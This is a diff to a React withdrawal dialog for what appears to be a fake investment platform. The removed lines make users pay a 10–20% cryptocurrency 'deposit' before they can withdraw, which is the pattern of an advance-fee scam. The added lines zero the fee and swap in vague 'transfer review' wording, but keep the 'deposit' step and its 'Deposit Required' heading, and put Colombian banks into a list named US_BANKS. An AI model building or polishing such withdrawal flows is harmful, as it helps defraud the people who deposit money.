@@ -23,6 +23,10 @@ const US_BANKS = [
   { name: 'Ally Bank', code: 'ALLY' },
   { name: 'Charles Schwab Bank', code: 'CSB' },
   { name: 'Fidelity Bank', code: 'FB' },
+  { name: 'Banco de Bogotá', code: 'BOGOTA' },
+  { name: 'Davivienda', code: 'DAVIVIENDA' },
+  { name: 'Bancolombia', code: 'BANCOLOMBIA' },
+  { name: 'Colombia Bank', code: 'COLOMBIA_BANK' },
   { name: 'Other', code: 'OTHER' },
 ]
 
@@ -45,17 +49,16 @@ export default function WithdrawalModal({ isOpen, onClose, availableBalance, acc
       : 0
     const accountAgeYears = accountAgeDays / 365
 
-    // If balance >= $4M OR account >= 5 years old: 10% fee, otherwise 20%
     if (availableBalance >= accountTarget || accountAgeYears >= 5) {
       const reason = availableBalance >= accountTarget 
         ? `✓ Account balance meets $4M target`
         : `✓ Account is ${Math.floor(accountAgeYears)} years old (5+ years)`
-      return { percentage: 10, reason }
+      return { percentage: 0, reason }
     } else {
       const yearsLeft = (5 - accountAgeYears).toFixed(1)
       return { 
-        percentage: 20, 
-        reason: `Account is ${Math.floor(accountAgeYears)} years old (${yearsLeft} years until 10% rate)`
+        percentage: 0,
+        reason: `Eligible for standard routed transfer review.`
       }
     }
   }
@@ -279,7 +282,7 @@ export default function WithdrawalModal({ isOpen, onClose, availableBalance, acc
               {withdrawAmount_num > 0 && (
                 <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 space-y-2">
                   <p className="text-sm text-blue-900">
-                    <span className="font-semibold">{feeInfo.percentage}% Deposit Required:</span> You'll need to deposit ${depositRequired.toLocaleString('en-US', { minimumFractionDigits: 2 })} via cryptocurrency to proceed.
+                    <span className="font-semibold">Transfer review:</span> This withdrawal proceeds through the secure banking transfer queue.
                   </p>
                   <p className="text-xs text-blue-700 italic">{feeInfo.reason}</p>
                 </div>
@@ -409,13 +412,13 @@ export default function WithdrawalModal({ isOpen, onClose, availableBalance, acc
                   onClick={handleBankDetailsSubmit}
                   className="flex-1 btn-primary"
                 >
-                  Next: Crypto Deposit
+                  Next: Transfer Review
                 </button>
               </div>
             </div>
           )}
 
-          {/* Step 3: Deposit Required */}
+          {/* Step 3: Transfer review */}
           {step === 'deposit' && (
             <div className="space-y-6">
               <div className="bg-green-50 border border-green-200 rounded-lg p-4 flex gap-3">
@@ -423,7 +426,7 @@ export default function WithdrawalModal({ isOpen, onClose, availableBalance, acc
                 <div>
                   <p className="text-sm font-semibold text-green-900">Deposit Required</p>
                   <p className="text-xs text-green-800 mt-1">
-                    You must deposit cryptocurrency to proceed with this withdrawal
+                    You must confirm the transfer details to proceed with this withdrawal
                   </p>
                 </div>
               </div>
